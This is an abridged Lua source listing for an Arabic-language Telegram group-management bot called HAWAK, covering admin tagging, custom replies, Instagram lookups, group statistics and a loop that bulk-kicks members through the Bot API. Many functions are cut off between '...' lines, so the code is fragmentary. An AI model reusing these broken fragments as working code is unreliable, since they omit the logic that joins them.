database:del(bot_id.."botss:HAWAK:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙰𝚆𝙰𝙺.',url="t.me/lllEll2"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."SrcDrg:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."SrcDrg:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."SrcDrg:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."SrcDrg:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."SrcDrg:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."SrcDrg:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس هــواك يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:HAWAK:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:HAWAK:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:HAWAK:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:HAWAK:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text2"..text)   
...
if text == 'تفعيل المغادره' and DevLeO(msg) then   
...
if text == 'تعطيل المغادره' and DevLeO(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
HAWAKdx(msg.chat_id_, msg.id_, ' ℘︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ℘︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ℘︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ℘︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevLeO(msg) then
...
{
{text = '𝐇𝐀𝐖𝐀𝐊 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/lllEll2"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙰𝚆𝙰𝙺. ](t.me/lllEll2)➤ ')
end
...
HAWAK = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(HAWAK)
...
--------------------------------------------------------------------------------------------------------------
SourceHAWAK(data.message_,data)
plugin_HAWAK(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local HAWAKAbot = database:get(bot_id.."HAWAK1:Add:Filter:Rp2"..text..result.chat_id_)   
if HAWAKAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..HAWAKAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local HAWAK1_Msg = database:get(bot_id.."HAWAK1:Add:Filter:Rp2"..text..result.chat_id_)   
if HAWAK1_Msg then    
send(msg.chat_id_, msg.id_," ℘︙ "..HAWAK1_Msg)
